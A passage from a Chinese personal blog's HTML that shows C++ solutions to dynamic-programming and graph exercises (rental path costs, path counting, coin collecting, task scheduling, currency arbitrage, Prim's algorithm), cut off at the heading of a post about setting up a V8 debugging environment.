class="line"><span class="comment">            3   0   0   0   0</span></span><br><span class="line"><span class="comment">p[i][j]：</span></span><br><span class="line"><span class="comment">    租船点\还船点</span></span><br><span class="line"><span class="comment">                0   1   2   3</span></span><br><span class="line"><span class="comment">            0   0   5   10  17</span></span><br><span class="line"><span class="comment">            1   0   0   5   12</span></span><br><span class="line"><span class="comment">            2   0   0   0   8</span></span><br><span class="line"><span class="comment">            3   0   0   0   0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="keyword">int</span> m[<span class="number">200</span>][<span class="number">200</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> p[<span class="number">200</span>][<span class="number">200</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; m[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> minNum = m[<span class="number">0</span>][i];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">            minNum = min(minNum, p[<span class="number">0</span>][j] + m[j][i]);</span><br><span class="line">        &#125;</span><br><span class="line">        p[<span class="number">0</span>][i] = minNum;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; p[<span class="number">0</span>][n - <span class="number">1</span>]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="Shortest-path-counting"><a href="#Shortest-path-counting" class="headerlink" title="Shortest path counting"></a>Shortest path counting</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-28-172016.png" alt=""><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> P[<span class="number">100</span>][<span class="number">100</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        P[<span class="number">0</span>][i]=<span class="number">1</span>;</span><br><span class="line">        P[i][<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">            P[i][j]=P[i<span class="number">-1</span>][j]+P[i][j<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;P[n<span class="number">-1</span>][n<span class="number">-1</span>]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="Coin-collecting-by-robot"><a href="#Coin-collecting-by-robot" class="headerlink" title="Coin-collecting by robot"></a>Coin-collecting by robot</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-28-172107.png" alt=""><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">map</span>[<span class="number">1000</span>][<span class="number">1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;m;j++)</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;<span class="built_in">map</span>[i][j];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;m;i++)&#123;</span><br><span class="line">        <span class="built_in">map</span>[<span class="number">0</span>][i]=<span class="built_in">map</span>[<span class="number">0</span>][i<span class="number">-1</span>]+<span class="built_in">map</span>[<span class="number">0</span>][i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">map</span>[i][<span class="number">0</span>]=<span class="built_in">map</span>[i<span class="number">-1</span>][<span class="number">0</span>]+<span class="built_in">map</span>[i][<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;m;j++)</span><br><span class="line">            <span class="built_in">map</span>[i][j]=max(<span class="built_in">map</span>[i<span class="number">-1</span>][j],<span class="built_in">map</span>[i][j<span class="number">-1</span>])+<span class="built_in">map</span>[i][j];</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="built_in">map</span>[n<span class="number">-1</span>][m<span class="number">-1</span>];</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"\r\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="Soldiers"><a href="#Soldiers" class="headerlink" title="Soldiers"></a>Soldiers</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-28-170631.png" alt=""><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,x[<span class="number">10001</span>],y[<span class="number">10001</span>];</span><br><span class="line">    <span class="keyword">int</span> xs,ys;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;x[i]&gt;&gt;y[i];</span><br><span class="line">        &#125;</span><br><span class="line">        sort(x,x+n);</span><br><span class="line">        sort(y,y+n);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            x[i]-=i;</span><br><span class="line">        &#125;</span><br><span class="line">        sort(x,x+n);</span><br><span class="line">        xs=ys=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            xs+=<span class="built_in">abs</span>(x[i]-x[n/<span class="number">2</span>]);</span><br><span class="line">            ys+=<span class="built_in">abs</span>(y[i]-y[n/<span class="number">2</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;xs+ys&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="Independent-Task-Scheduling"><a href="#Independent-Task-Scheduling" class="headerlink" title="Independent Task Scheduling"></a>Independent Task Scheduling</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-28-170826.png" alt=""><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">202</span>][<span class="number">10000</span>];<span class="comment">//dp[i][j] 表示前i个作业中A机器花j分钟的时候 B机器所花时间</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">200</span>], b[<span class="number">200</span>];</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; a[i];</span><br><span class="line">        sum += a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; b[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= sum; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (j &lt; a[i]) &#123;<span class="comment">//A机器时间不足，只能用B的</span></span><br><span class="line">                dp[i][j] = dp[i - <span class="number">1</span>][j] + b[i];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//dp[i][j] = dp[i-1][j]+b[i]代表第i个任务交给B来做，所以做完前i个任务的时候,A机器和前i - 1的任务一样，还是花了j分钟，而B机器则花dp[i-1][j]+b[i]分钟；</span></span><br><span class="line">                <span class="comment">//dp[i][j] = dp[i-1][j-a[i]]代表第i个任务交给A来做，现在的A机器花费时间是j，所以在前i - 1个任务完成的时候，A机器是花了j-a[i]分钟的，所以现在B机器还是花了dp[i-1][j-a[i]]分钟；</span></span><br><span class="line">                dp[i][j] = min(dp[i - <span class="number">1</span>][j] + b[i], dp[i - <span class="number">1</span>][j - a[i]]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">999999</span>;</span><br><span class="line">    <span class="comment">//max(dp[n][i],i) 表示完成前n个作业A机器花i分钟 B机器花dp[n][i]分钟情况下，最迟完工时间</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= sum; i++)</span><br><span class="line">        ans = min(ans, max(dp[n][i], i));</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; ans &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="Arbitrage"><a href="#Arbitrage" class="headerlink" title="Arbitrage"></a>Arbitrage</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-28-170934.png" alt=""><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="built_in">map</span>&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt; money;</span><br><span class="line"><span class="keyword">double</span> rates[<span class="number">100</span>][<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Arbitrage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; n; k++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">double</span> tmp = rates[i][k] * rates[k][j];</span><br><span class="line">                rates[i][j] = max(tmp, rates[i][j]);</span><br><span class="line">                <span class="keyword">if</span> (rates[i][j] * rates[j][i] &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">0</span>, countt = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; n &amp;&amp; n) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="built_in">string</span> temp;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; temp;</span><br><span class="line">            money[temp] = i;</span><br><span class="line">            rates[i][i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> m;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; m;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="built_in">string</span> a, b;</span><br><span class="line">            <span class="keyword">double</span> rate;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; a &gt;&gt; rate &gt;&gt; b;</span><br><span class="line">            rates[money[a]][money[b]] = rate;</span><br><span class="line">        &#125;</span><br><span class="line">        flag = Arbitrage();</span><br><span class="line">        <span class="keyword">if</span> (flag)</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"Case "</span> &lt;&lt; countt++ &lt;&lt; <span class="string">" Yes"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"Case "</span> &lt;&lt; countt++ &lt;&lt; <span class="string">" No"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="求最小生成树-Prim算法）"><a href="#求最小生成树-Prim算法）" class="headerlink" title="求最小生成树(Prim算法）"></a>求最小生成树(Prim算法）</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-28-171033.png" alt=""><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inf 32767</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">int</span> e;</span><br><span class="line">    <span class="keyword">char</span> data[<span class="number">500</span>];</span><br><span class="line">    <span class="keyword">int</span> edge[<span class="number">500</span>][<span class="number">500</span>];</span><br><span class="line">&#125; Graph;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="keyword">int</span> cost;</span><br><span class="line">&#125; mincost;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="keyword">int</span> y;</span><br><span class="line">    <span class="keyword">int</span> weight;</span><br><span class="line">&#125; EDGE;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="keyword">int</span> flag;</span><br><span class="line">&#125; F;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(Graph &amp;G, <span class="keyword">int</span> n, <span class="keyword">int</span> e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, k, w;</span><br><span class="line">    <span class="keyword">char</span> a, b;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; G.data[i];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == j)</span><br><span class="line">                G.edge[i][j] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                G.edge[i][j] = inf;<span class="comment">//模板里是G.edge[i][j]=100;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; e; k++) &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; a;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; b;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; w;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">            <span class="keyword">if</span> (G.data[i] == a) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            <span class="keyword">if</span> (G.data[j] == b) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        G.edge[i][j] = w;</span><br><span class="line">        G.edge[j][i] = w;</span><br><span class="line">    &#125;</span><br><span class="line">    G.n = n;</span><br><span class="line">    G.e = e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Prim</span><span class="params">(Graph &amp;G, <span class="keyword">int</span> v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> lowcost[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> min, closest[<span class="number">100</span>], i, j, k;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; G.n; i++) &#123;</span><br><span class="line">        lowcost[i] = G.edge[v][i];</span><br><span class="line">        closest[i] = v;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; G.n; i++) &#123;</span><br><span class="line">        min = inf;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; G.n; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (lowcost[j] &amp;&amp; lowcost[j] &lt; min) &#123;</span><br><span class="line">                min = lowcost[j];</span><br><span class="line">                k = j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">'('</span> &lt;&lt; G.data[closest[k]] &lt;&lt; <span class="string">','</span> &lt;&lt; G.data[k] &lt;&lt; <span class="string">')'</span>;</span><br><span class="line">        lowcost[k] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; G.n; j++)</span><br><span class="line">            <span class="keyword">if</span> (G.edge[k][j] &amp;&amp; G.edge[k][j] &lt; lowcost[j]) &#123;</span><br><span class="line">                lowcost[j] = G.edge[k][j];<span class="comment">//更新距离</span></span><br><span class="line">                closest[j] = k;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Graph my;</span><br><span class="line">    <span class="keyword">int</span> n, e;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n &gt;&gt; e;</span><br><span class="line">    create(my, n, e);</span><br><span class="line">    Prim(my, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://eternalsakura13.com/2018/06/26/v8_environment/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="sakura">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sakuraのblog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/06/26/v8_environment/" itemprop="url">v8调试环境搭建(解决遇到的一些问题)</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-26T03:54:15+08:00">
                2018-06-26
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/浏览器/" itemprop="url" rel="index">
                    <span itemprop="name">浏览器</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
